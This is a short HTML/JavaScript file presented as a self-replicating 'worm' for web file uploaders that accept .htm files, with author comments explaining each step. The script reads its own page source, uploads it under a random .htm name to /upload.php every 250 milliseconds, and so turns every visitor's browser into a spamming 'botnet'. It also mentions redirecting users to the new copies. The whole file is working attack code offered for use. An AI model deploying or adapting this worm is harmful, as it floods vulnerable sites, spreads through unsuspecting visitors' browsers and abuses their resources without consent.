            Landon Powell's wonderful worm for 
            file uploaders that don't blacklist
            .html, .htm, and other file extensions.

            Because of this, SoP can be bypassed.

            If you wanted to add some fun, you could 
            throw a tracking pixel in here, but I'm 
            trying to keep this demo self-contained.

            Overview: Webbrowsers accesing the file
            through a compromised website become a
            botnet that spams the site with uploads.

        <script type="text/javascript">

// We're going to use a function since we're going to use setInterval to loop what we're doing.
function uploadYourself() {
    // We just start by creating a form that exists within JS.
    var form = new FormData();

    // Then, we create a new file. 
    var file = new File(
        [document.documentElement.innerHTML],   // The file's content is the same as our webpage's. 
        (Math.random() + ".htm").substr(2)      // A random '.htm' filename is generated.
    );

    // Toss that file onto the form.
    // I assume the 'name=' attribute for the uploaded file is 'file' for this.
    form.append("file", file);
    // You might have to toss some more attributes onto the form to make the upload work. 

    // Next up, we just send the form through a post request. That's all, folks!
    var request = new XMLHttpRequest();
    // This script assumes the file upload script is at 'http://dumbass.com/upload.php'.
    // I assume this because only a PHP user would fuck up this badly. Signed, a former PHP user.
    request.open("POST", "/upload.php");
    request.send(form);

    // Just for the sake of knowing something is happening, I log the file name to the console.
    console.log(file.name);
}

// Adjust '250' in case the server detects spam.
setInterval(uploadYourself, 250);

// Just to spice things up, we could redirect the user to the file they made.
// location = "/files/" + x.name;
